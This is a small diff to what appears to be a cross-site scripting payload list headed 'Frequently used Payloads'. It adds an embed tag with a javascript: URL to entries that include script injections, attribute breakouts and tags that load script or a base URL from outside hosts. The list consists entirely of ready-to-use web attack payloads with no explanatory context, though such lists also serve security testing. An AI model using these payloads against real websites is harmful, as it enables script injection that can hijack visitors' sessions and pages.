@@ -1,6 +1,7 @@
 ===============================Frequently used Payloads start===============================
 
 <base href=//knoxss.me?>
+xss"'><embed/src=javascript:alert(document.domain)>
 <script src=//14.rs>
 '"><script>alert(-1)</script><
 m"onmouseover="prompt(-11)
